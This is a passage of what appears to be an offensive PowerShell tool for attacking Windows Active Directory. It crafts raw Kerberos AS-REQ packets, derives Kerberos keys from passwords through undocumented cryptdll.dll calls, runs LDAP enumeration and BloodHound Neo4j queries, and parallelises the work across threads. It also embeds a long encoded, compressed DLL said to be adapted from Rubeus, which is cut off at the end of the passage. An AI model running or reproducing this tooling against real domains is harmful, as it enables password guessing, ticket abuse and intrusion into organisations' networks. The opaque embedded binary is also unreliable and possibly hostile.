    $totalSeq = [Asn1.AsnElt]::Make([Asn1.AsnElt]::SEQUENCE, @($asReqSeq))
    $appSeq = [Asn1.AsnElt]::MakeImplicit([Asn1.AsnElt]::APPLICATION, 10, $totalSeq)

    return $appSeq.Encode()
}

function Local:KerberosPasswordHash {
    [CmdletBinding()]
    param ( 
        [parameter(Mandatory=$true)]
        [UInt32]
        $eType,

        [parameter(Mandatory=$false)]
        [String]
        $Password,

        [parameter(Mandatory=$true)]
        [String]
        $Salt,

        [parameter(Mandatory=$true)]
        [int]
        $Count = 4096
    )

    $KERB_ECRYPT = [Win32+KERB_ECRYPT]
    $UNICODE_STRING = [Win32+UNICODE_STRING]

    $kerbEcryptSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$KERB_ECRYPT)
    $pCSystemPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($kerbEcryptSize)
    $status = [Win32]::CDLocateCSystem($eType, [ref]$pCSystemPtr)
    if ($status -ne 0) {
        throw New-Object ComponentModel.Win32Exception -ArgumentList ($status, "Error on CDLocateCSystem")
    }
    $pCSystem = [System.Runtime.InteropServices.Marshal]::PtrToStructure($pCSystemPtr, [Type]$KERB_ECRYPT)

    $passwordUnicode = New-Object $UNICODE_STRING $Password
    $saltUnicode = New-Object $UNICODE_STRING $Salt
    $output = New-Object Byte[] $pCSystem.KeySize

    $KerbEcryptHashPasswordDelegate = Get-DelegateType @($UNICODE_STRING, $UNICODE_STRING, [int], [byte[]]) ([int])
    $KerbEcryptHashPassword = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($pCSystem.HashPassword, $KerbEcryptHashPasswordDelegate)
    $status = $KerbEcryptHashPassword.Invoke($passwordUnicode, $saltUnicode, $Count, $output)
    if ($status -ne 0) {
        throw New-Object ComponentModel.Win32Exception -ArgumentList ($status)
    }

    return $output
}

function Local:KerberosEncrypt {
    [CmdletBinding()]
    param ( 
        [parameter(Mandatory=$true)]
        [UInt32]
        $eType,

        [parameter(Mandatory=$true)]
        [int]
        $keyUsage,

        [parameter(Mandatory=$true)]
        [byte[]]
        $key,

        [parameter(Mandatory=$true)]
        [byte[]]
        $data
    )

    $KERB_ECRYPT = [Win32+KERB_ECRYPT]

    $kerbEcryptSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$KERB_ECRYPT)
    $pCSystemPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($kerbEcryptSize)
    $status = [Win32]::CDLocateCSystem($eType, [ref]$pCSystemPtr)
    if ($status -ne 0) {
        throw New-Object ComponentModel.Win32Exception -ArgumentList ($status, "Error on CDLocateCSystem")
    }
    $pCSystem = [System.Runtime.InteropServices.Marshal]::PtrToStructure($pCSystemPtr, [Type]$KERB_ECRYPT)

    $outputSize = $data.Length
    if($data.Length % $pCSystem.BlockSize -ne 0) {
        $outputSize += $pCSystem.BlockSize - ($data.Length % $pCSystem.BlockSize)
    }
    $outputSize += $pCSystem.Size
    $output = New-Object Byte[] $outputSize

    $pContext = [IntPtr]::Zero
    $KerbEcryptInitializeDelegate = Get-DelegateType @([byte[]], [int], [int], [IntPtr].MakeByRefType()) ([int])
    $KerbEcryptInitialize = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($pCSystem.Initialize, $KerbEcryptInitializeDelegate)
    $status = $KerbEcryptInitialize.Invoke($key, $key.Length, $keyUsage, [ref]$pContext)
    if ($status -ne 0) {
        throw New-Object ComponentModel.Win32Exception -ArgumentList ($status)
    }

    $KerbEcryptEncryptDelegate = Get-DelegateType @([IntPtr], [byte[]], [int], [byte[]], [IntPtr].MakeByRefType()) ([int])
    $KerbEcryptEncrypt = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($pCSystem.Encrypt, $KerbEcryptEncryptDelegate)
    $KerbEcryptEncrypt.Invoke($pContext, $data, $data.Length, $output, [ref]$outputSize) | Out-Null

    $KerbEcryptFinishDelegate = Get-DelegateType @([IntPtr].MakeByRefType()) ([int])
    $KerbEcryptFinish = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($pCSystem.Finish, $KerbEcryptFinishDelegate)
    $KerbEcryptFinish.Invoke([ref]$pContext) | Out-Null

    return $output
}

function Local:Get-LdapObject {
    Param (
        [Parameter(Mandatory=$true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ADSpath,

        [Parameter(Mandatory=$true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Filter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties = '*',

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200,

        [String]
        $LdapUser,

        [String]
        $LdapPass
    )

    if ($LdapUser) {
        $domainObject = New-Object System.DirectoryServices.DirectoryEntry($ADSpath, $LdapUser, $LdapPass)
        $searcher = New-Object System.DirectoryServices.DirectorySearcher($domainObject)
    }
    else {
        $searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$ADSpath)
    }
    $searcher.PageSize = $PageSize
    $searcher.CacheResults = $false
    $searcher.filter = $Filter
    $propertiesToLoad = $Properties | ForEach-Object {$_.Split(',')}
    $searcher.PropertiesToLoad.AddRange($propertiesToLoad) | Out-Null
    Try {
        $results = $searcher.FindAll()
        $results | Where-Object {$_} | ForEach-Object {
            $objectProperties = @{}
            $p = $_.Properties
            $p.PropertyNames | ForEach-Object {
                if (($_ -ne 'adspath') -And ($p[$_].count -eq 1)) {
                    $objectProperties[$_] = $p[$_][0]
                }
                elseif ($_ -ne 'adspath') {
                    $objectProperties[$_] = $p[$_]
                }
            }
            New-Object -TypeName PSObject -Property ($objectProperties)
        }
        $results.dispose()
        $searcher.dispose()
    } Catch {
        Write-Error $_ -ErrorAction Stop
    }
}

function Local:New-BloodHoundQuery {
    [CmdletBinding()]
    Param(
        [ValidateNotNullOrEmpty()]
        [String]
        $Neo4jHost = '127.0.0.1',

        [ValidateNotNullOrEmpty()]
        [Int32]
        $Neo4jPort = 7474,

        [ValidateNotNullOrEmpty()]
        [String]
        $Query,

        [ValidateNotNullOrEmpty()]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]
        $Credential = [System.Management.Automation.PSCredential]::Empty
    )

    $Uri = "http://$($Neo4jHost):$($Neo4jPort)/db/data/cypher"
    $Header = @{'Accept'='application/json; charset=UTF-8'; 'Content-Type'='application/json'}
    $Body = @{query=$Query} | ConvertTo-Json
    $reply = Invoke-RestMethod -Uri $Uri -Method Post -Headers $Header -Body $Body -Credential $Credential -Verbose:$false
    if($reply){
        return $reply
    }
}

function Local:New-ThreadedFunction {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [System.Array]
        $Collection,

        [Parameter(Mandatory = $True)]
        [System.Management.Automation.ScriptBlock]
        $ScriptBlock,

        [Hashtable]
        $ScriptParameters,

        [Int]
        [ValidateRange(1,  100)]
        $Threads = 2,

        [Switch]
        $NoImports
    )

    BEGIN {
        $SessionState = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
        $SessionState.ApartmentState = [System.Threading.Thread]::CurrentThread.GetApartmentState()

        # Import the current session state's variables and functions so the chained functionality can be used by the threaded blocks
        if (-not $NoImports) {
            # Grab all the current variables for this runspace
            $MyVars = Get-Variable -Scope 2

            # These variables are added by Runspace.Open() method and produce Stop errors if added twice
            $VorbiddenVars = @('?','args','ConsoleFileName','Error','ExecutionContext','false','HOME','Host','input','InputObject','MaximumAliasCount','MaximumDriveCount','MaximumErrorCount','MaximumFunctionCount','MaximumHistoryCount','MaximumVariableCount','MyInvocation','null','PID','PSBoundParameters','PSCommandPath','PSCulture','PSDefaultParameterValues','PSHOME','PSScriptRoot','PSUICulture','PSVersionTable','PWD','ShellId','SynchronizedHash','true')

            # Add variables from Parent Scope (current runspace) into the InitialSessionState
            ForEach ($Var in $MyVars) {
                if ($VorbiddenVars -NotContains $Var.Name) {
                $SessionState.Variables.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $Var.name,$Var.Value,$Var.description,$Var.options,$Var.attributes))
                }
            }

            # Add functions from current runspace to the InitialSessionState
            ForEach ($Function in (Get-ChildItem Function:)) {
                $SessionState.Commands.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList $Function.Name, $Function.Definition))
            }
        }

        # Create a pool of $Threads runspaces
        $Pool = [RunspaceFactory]::CreateRunspacePool(1, $Threads, $SessionState, $Host)
        $Pool.Open()

        # Get the proper BeginInvoke() method that allows for an output queue
        $Method = $Null
        ForEach ($M in [PowerShell].GetMethods() | Where-Object { $_.Name -eq 'BeginInvoke' }) {
            $MethodParameters = $M.GetParameters()
            if (($MethodParameters.Count -eq 2) -and $MethodParameters[0].Name -eq 'input' -and $MethodParameters[1].Name -eq 'output') {
                $Method = $M.MakeGenericMethod([Object], [Object])
                break
            }
        }

        $Jobs = @()
        $Collection = $Collection | Where-Object {$_}
        Write-Verbose "[New-ThreadedFunction] Total number of elements in collection: $($Collection.Count)"

        # Partition collection into $Threads number of groups
        if ($Threads -ge $Collection.Count) {
            $Threads = $Collection.Count
        }
        $ElementSplitSize = [Int]($Collection.Count/$Threads)
        $CollectionPartitioned = @()
        $Start = 0
        $End = $ElementSplitSize

        for($i = 1; $i -le $Threads; $i++) {
            $List = New-Object System.Collections.ArrayList
            if ($i -eq $Threads) {
                $End = $Collection.Count
            }
            $List.AddRange($Collection[$Start..($End-1)])
            $Start += $ElementSplitSize
            $End += $ElementSplitSize
            $CollectionPartitioned += @(,@($List.ToArray()))
        }

        Write-Verbose "[New-ThreadedFunction] Total number of threads/partitions: $Threads"

        ForEach ($CollectionPartition in $CollectionPartitioned) {
            # Create a "powershell pipeline runner"
            $PowerShell = [PowerShell]::Create()
            $PowerShell.runspacepool = $Pool

            # Add the script block and arguments
            $Null = $PowerShell.AddScript($ScriptBlock).AddParameter('Collection', $CollectionPartition)
            if ($ScriptParameters) {
                ForEach ($Param in $ScriptParameters.GetEnumerator()) {
                    $Null = $PowerShell.AddParameter($Param.Name, $Param.Value)
                }
            }

            # Create the output queue
            $Output = New-Object Management.Automation.PSDataCollection[Object]

            # Start job
            $Jobs += @{
                PS = $PowerShell
                Output = $Output
                Result = $Method.Invoke($PowerShell, @($Null, [Management.Automation.PSDataCollection[Object]]$Output))
            }
        }
    }

    END {
        Write-Verbose "[New-ThreadedFunction] Threads executing"

        # Continuously loop through each job queue, consuming output as appropriate
        Do {
            ForEach ($Job in $Jobs) {
                $Job.Output.ReadAll()
            }
            Start-Sleep -Seconds 1
        }
        While (($Jobs | Where-Object { -not $_.Result.IsCompleted }).Count -gt 0)

        # Cleanup
        $SleepSeconds = 2
        Write-Verbose "[New-ThreadedFunction] Waiting $SleepSeconds seconds for final cleanup..."
        for ($i=0; $i -lt $SleepSeconds; $i++) {
            ForEach ($Job in $Jobs) {
                $Job.Output.ReadAll()
                $Job.PS.Dispose()
            }
            Start-Sleep -S 1
        }
        $Pool.Dispose()
        Write-Verbose "[New-ThreadedFunction] all threads completed"
    }
}

function Local:Get-DelegateType {
    Param (
        [OutputType([Type])]

        [Parameter( Position = 0)]
        [Type[]]
        $Parameters = (New-Object Type[](0)),

        [Parameter( Position = 1 )]
        [Type]
        $ReturnType = [Void]
    )

    $Domain = [AppDomain]::CurrentDomain
    $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
    $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
    $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
    $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
    $MethodBuilder.SetImplementationFlags('Runtime, Managed')
    Write-Output $TypeBuilder.CreateType()
}

$Win32 = @"
using System;
using System.ComponentModel;
using System.Runtime.InteropServices;

public class Win32 {
    [DllImport("cryptdll.Dll", CharSet = CharSet.Auto, SetLastError = false)]
    public static extern int CDLocateCSystem(UInt32 type, out IntPtr pCheckSum);

    [StructLayout(LayoutKind.Sequential)]
    public struct UNICODE_STRING : IDisposable {
        public ushort Length;
        public ushort MaximumLength;
        public IntPtr buffer;

        public UNICODE_STRING(string s) {
            Length = (ushort)(s.Length * 2);
            MaximumLength = (ushort)(Length + 2);
            buffer = Marshal.StringToHGlobalUni(s);
        }

        public void Dispose() {
            Marshal.FreeHGlobal(buffer);
            buffer = IntPtr.Zero;
        }

        public override string ToString() {
            return Marshal.PtrToStringUni(buffer);
        }
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct KERB_ECRYPT {
        int Type0;
        public int BlockSize;
        int Type1;
        public int KeySize;
        public int Size;
        int unk2;
        int unk3;
        public IntPtr AlgName;
        public IntPtr Initialize;
        public IntPtr Encrypt;
        public IntPtr Decrypt;
        public IntPtr Finish;
        public IntPtr HashPassword;
        IntPtr RandomKey;
        IntPtr Control;
        IntPtr unk0_null;
        IntPtr unk1_null;
        IntPtr unk2_null;
    }
}
"@
Add-Type -TypeDefinition $Win32

# Asn1 library adapted from https://github.com/GhostPack/Rubeus (BSD 3-Clause license)
$EncodedCompressedDll = @'
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